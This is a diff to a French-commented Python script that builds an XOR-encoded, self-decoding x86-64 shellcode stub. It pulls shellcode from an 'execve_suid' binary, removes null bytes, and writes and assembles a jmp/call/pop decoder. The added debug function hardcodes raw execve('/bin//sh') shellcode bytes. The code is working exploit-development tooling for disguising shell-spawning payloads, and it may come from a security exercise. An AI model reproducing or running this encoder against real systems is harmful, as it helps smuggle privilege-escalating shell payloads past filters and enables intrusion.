@@ -11,21 +11,14 @@ SUCCESS = "[SUCCES] "
 dir = './'
 shellcode = "execve_suid"
 encoded   = "wished_encoding"
-asmres    = "ress.asm"
+asmres    = "ress.s"
 executable = "exec"
 
 def get_shellcode(file_path):
-    result = subprocess.run(['objdump', '-s', file_path], stdout=subprocess.PIPE)
-    result = result.stdout.decode('utf-8')
-    result = result.split('\n')
-    result = result[4:]
-
-    clean_res = []
-    for i in result:
-        r = ''.join(i.split(' ')[2:6])
-        if r != '': clean_res.append(r)
-
-    return bytes.fromhex(''.join(clean_res))
+    # Extract .text section
+    subprocess.run(['objcopy', '-O', 'binary', '--only-section=.text', file_path, 'shellcode.bin'])
+    with open('shellcode.bin', 'rb') as f:
+        return f.read()
 
 
 # Recuperer l'encodage souhaité du shellcode
@@ -73,13 +66,14 @@ def ensure_no_null_bytes(code, what):
 # ecrire le code assembler
 def write_assembly(mask, encoding, file_path):
     with open(file_path, 'w') as f:
-        f.write("\t.global _start\n\t.text\n_start:\n\tjmp trois\nun:\n\tpop %rsi\ndeux:\n")
+        f.write("\t.global _start\n\t.text\n_start:\n\tsub $0x100, %rsp\n\tjmp trois\nun:\n\tpop %rsi\ndeux:\n")
         i = 0
-        while i < len(mask) - 4:
-            f.write(f"\txorl $0x{mask[i + 3]:02x}{mask[i + 2]:02x}{mask[i + 1]:02x}{mask[i + 0]:02x}, (%rsi)\n\tadd $4, %rsi\n")
+        while i < len(mask) - 3:
+            # f.write(f"\txorl $0x{mask[i]:02x}{mask[i+1]:02x}{mask[i + 2]:02x}{mask[i + 3]:02x}, (%rsi)\n{'\tadd $4, %rsi\n' if i < len(mask) - 4 else ''}")
+            f.write(f"\txorl $0x{mask[i + 3]:02x}{mask[i + 2]:02x}{mask[i + 1]:02x}{mask[i + 0]:02x}, (%rsi)\n{'\tadd $4, %rsi\n' if i < len(mask) - 4 else ''}")
             i += 4
         while i < len(mask):
-            f.write(f"\txorb $0x{mask[i]:02x}, (%rsi)\n\tinc %rsi\n")
+            f.write(f"\txorb $0x{mask[i]:02x}, (%rsi){'\n\tinc %rsi' if i < len(mask) - 1 else ''}\n")
             i += 1        
         f.write("\tjmp quatre\ntrois:\n\tcall un\nquatre:\n\t.byte ")
         
@@ -95,13 +89,16 @@ def write_assembly(mask, encoding, file_path):
 def compiler_assembler(file_path, executable):
     result = subprocess.run(['as', file_path, '-o', file_path + '.o'], stdout=subprocess.PIPE)
     result = subprocess.run(['ld', file_path + '.o', '-o', executable], stdout=subprocess.PIPE)
+    result = subprocess.run(['rm', file_path + '.o'], stdout=subprocess.PIPE)
+
     if result.returncode != 0:
         print(ERROR + "Compilation failed")
         exit(1)
     else:
         print(SUCCESS + "Compilation succeeded")
 
-if __name__ == '__main__':
+def main():
+
     shellcode_data = get_shellcode(dir + shellcode)
     encoding = get_encoded_file(dir + encoded)
 
@@ -119,9 +116,31 @@ if __name__ == '__main__':
     ensure_no_null_bytes(mask, 'mask')
     ensur_XOR_isCorrect(shellcode_data, encoding, mask)
 
+    print(INFO + 'encoding: ' + ''.join(f'\\x{byte:02x}' for byte in encoding))
     write_assembly(mask, encoding, dir + asmres)
     compiler_assembler(dir + asmres, dir + executable)
 
+def debug():
 
+    encoding = get_encoded_file(dir + encoded)
+    shellcode_data = b'\x6a\x3b\x58\x48\x31\xf6\x48\x89\xf2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x0f\x05'
+    shellcode_data = add_padding(shellcode_data, len(encoding))
+    print(len(encoding))
+    print(len(shellcode_data))
 
+    mask = create_XOR_mask(shellcode_data, encoding)
+
+    print(encoding)
+    print(''.join(f'\\x{byte:02x}' for byte in encoding))
     
+    print(''.join(f'\\x{byte:02x}' for byte in mask))
+
+    print(''.join(f'\\x{byte:02x}' for byte in shellcode_data))
+
+    write_assembly(mask, encoding, dir + asmres)
+
+    compiler_assembler(dir+asmres, 'prec')
+
+if __name__ == '__main__':
+    main()
+    # debug()
